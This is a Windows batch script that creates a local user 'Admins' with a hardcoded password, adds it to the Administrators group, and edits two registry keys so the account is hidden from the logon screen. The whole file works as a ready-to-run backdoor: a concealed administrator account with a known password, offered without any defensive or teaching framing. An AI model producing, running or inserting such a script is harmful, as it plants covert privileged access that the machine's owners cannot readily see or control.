@echo off

:: Check for administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrative privileges. Please run as administrator.
    exit /b
)

:: Check if the user 'Admins' exists
net user Admins >nul 2>&1
if %errorlevel% equ 0 (
    echo User 'Admins' already exists. Skipping creation.
) else (
    echo Creating user 'Admins'...
    net user Admins sistvnc /add
)

:: Check if the user 'Admins' is already in the Administrators group
net localgroup Administrators | findstr /i "\<Admins\>" >nul 2>&1
if %errorlevel% equ 0 (
    echo User 'Admins' is already in the Administrators group. Skipping addition.
) else (
    echo Adding user 'Admins' to the Administrators group...
    net localgroup Administrators Admins /add
)

:: Navigate to the required registry path and create the UserList key if it doesn't exist
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UserList" /f

:: Hide the 'Admins' user account from the login screen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\UserList" /v Admins /t REG_DWORD /d 0 /f
echo Username 'Admins' has been hidden from the logon screen.

:: Hide the 'Admins' user account from the login screen via Winlogon registry key
SETLOCAL
SET USERNAME=Admins
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %USERNAME% /t REG_DWORD /d 0 /f
echo User account '%USERNAME%' has been hidden from the login screen.

timeout /t 1 && exit


